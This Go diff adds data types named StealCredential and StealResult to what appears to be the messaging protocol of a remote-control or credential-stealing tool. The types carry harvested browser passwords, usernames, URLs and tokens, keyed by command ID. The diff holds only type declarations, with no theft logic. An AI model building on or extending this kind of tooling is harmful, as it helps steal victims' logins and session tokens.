@@ -253,3 +253,19 @@ type FunResult struct {
 	OK        bool   `msgpack:"ok"`
 	Message   string `msgpack:"message"`
 }
+
+type StealCredential struct {
+	Browser  string `msgpack:"browser"`
+	Profile  string `msgpack:"profile"`
+	URL      string `msgpack:"url"`
+	Username string `msgpack:"username"`
+	Password string `msgpack:"password"`
+}
+
+type StealResult struct {
+	Type        string            `msgpack:"type"`
+	CommandID   string            `msgpack:"commandId"`
+	Credentials []StealCredential `msgpack:"credentials"`
+	Tokens      []string          `msgpack:"tokens"`
+	Errors      []string          `msgpack:"errors"`
+}
